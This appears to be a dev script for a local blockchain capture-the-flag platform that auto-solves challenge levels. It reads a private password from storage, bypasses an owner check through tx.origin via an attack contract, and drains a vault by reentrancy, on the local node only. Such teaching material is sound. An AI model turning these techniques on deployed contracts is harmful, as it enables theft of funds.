// Joue l'exploit d'une épreuve pour un joueur, sur le nœud local (`pnpm chain`).
// Le joueur doit d'abord créer son instance dans l'UI, puis cliquer « Vérifier
// ma réussite » une fois le script passé.
//
// - Coffre : déploie VaultAttack et vide le coffre par réentrance.
// - Usurpateur : déploie ImpostorAttack, qui appelle changeOwner via un contrat.
// - Coffre-fort à code : lit le slot 1 de l'instance et appelle unlock.
// - Factory de test : appelle solve().
//
// Les contrats d'attaque viennent de contracts/contracts/exploits/ : ils ne
// servent qu'aux tests et au nœud local, jamais sur Base Sepolia.
//
//   PLAYER=3 CTF=0 LEVEL=0 pnpm chain:solve   # compte #3 (bob), Coffre
import { readFileSync } from "node:fs"
import { fileURLToPath } from "node:url"

import { network } from "hardhat"
import { getAddress, zeroAddress, type Address } from "viem"

const connection = await network.create()
if (connection.networkName !== "localhost") {
  throw new Error(
    `dev-solve ne tourne que sur le nœud local (--network localhost), pas sur « ${connection.networkName} ».`
  )
}

function intEnv(name: string, fallback: number) {
  const value = Number(process.env[name] ?? fallback)
  if (!Number.isInteger(value) || value < 0)
    throw new Error(`${name} doit être un entier positif ou nul.`)
  return value
}

const playerIndex = intEnv("PLAYER", 2)
const ctfId = BigInt(intEnv("CTF", 0))
const level = intEnv("LEVEL", 0)

// Adresses écrites par `pnpm chain:deploy`.
const envPath = fileURLToPath(new URL("../../.env.local", import.meta.url))
const env = readFileSync(envPath, "utf8")
function envAddress(key: string): Address | undefined {
  const match = env.match(new RegExp(`^${key}=(0x[0-9a-fA-F]{40})$`, "m"))
  return match ? getAddress(match[1]) : undefined
}
const platformAddress = envAddress("NEXT_PUBLIC_CTF_PLATFORM_ADDRESS")
if (!platformAddress) throw new Error("Lancer `pnpm chain:deploy` d'abord.")

const { viem } = connection
const publicClient = await viem.getPublicClient()
const wallets = await viem.getWalletClients()
const player = wallets[playerIndex]
if (!player) throw new Error(`Pas de compte #${playerIndex}.`)
const as = { account: player.account }
const wallet = { client: { wallet: player } }

const platform = await viem.getContractAt("CTFPlatform", platformAddress)
const levels = await platform.read.getLevels([ctfId])
const factory = levels[level]?.factory
if (!factory) throw new Error(`Le CTF ${ctfId} n'a pas d'épreuve ${level}.`)

const instance = await platform.read.instanceOf([
  ctfId,
  BigInt(level),
  player.account.address,
])
if (instance === zeroAddress) {
  throw new Error(
    `Le compte #${playerIndex} n'a pas d'instance pour l'épreuve ${level} du CTF ${ctfId} : la créer dans l'UI.`
  )
}

const wait = (hash: `0x${string}`) =>
  publicClient.waitForTransactionReceipt({ hash })
const same = (a: Address | undefined) =>
  a !== undefined && a.toLowerCase() === factory.toLowerCase()

/** Une VaultFactory se reconnaît à sa constante SEED. */
async function isVaultFactory() {
  try {
    const vault = await viem.getContractAt("VaultFactory", factory)
    await vault.read.SEED()
    return true
  } catch {
    return false
  }
}

let exploit: string
if (same(envAddress("NEXT_PUBLIC_CODE_SAFE_FACTORY_ADDRESS"))) {
  // `private` ne cache rien : le mot de passe est dans le slot 1.
  const password = await publicClient.getStorageAt({
    address: instance,
    slot: "0x1",
  })
  const safe = await viem.getContractAt("CodeSafe", instance)
  await wait(await safe.write.unlock([password!], as))
  exploit = `mot de passe lu dans le slot 1 (${password}), unlock`
} else if (same(envAddress("NEXT_PUBLIC_IMPOSTOR_FACTORY_ADDRESS"))) {
  // Via un contrat : tx.origin est le joueur, msg.sender le contrat.
  const attack = await viem.deployContract("ImpostorAttack", [], wallet)
  await wait(await attack.write.run([instance], as))
  exploit = "changeOwner appelé via ImpostorAttack"
} else if (same(envAddress("NEXT_PUBLIC_TEST_FACTORY_ADDRESS"))) {
  const test = await viem.getContractAt("TestInstance", instance)
  await wait(await test.write.solve(as))
  exploit = "solve()"
} else if (await isVaultFactory()) {
  // Dépose le solde du coffre, puis withdraw rappelé depuis receive().
  const balance = await publicClient.getBalance({ address: instance })
  const attack = await viem.deployContract("VaultAttack", [instance], wallet)
  await wait(await attack.write.run({ ...as, value: balance }))
  exploit = `coffre vidé par réentrance (VaultAttack, dépôt de ${balance} wei)`
} else {
  throw new Error(`Factory ${factory} inconnue : pas d'exploit à jouer.`)
}

console.log(
  `Instance ${instance} résolue par le compte #${playerIndex} : ${exploit}. Cliquer « Vérifier ma réussite » dans l'UI.`
)
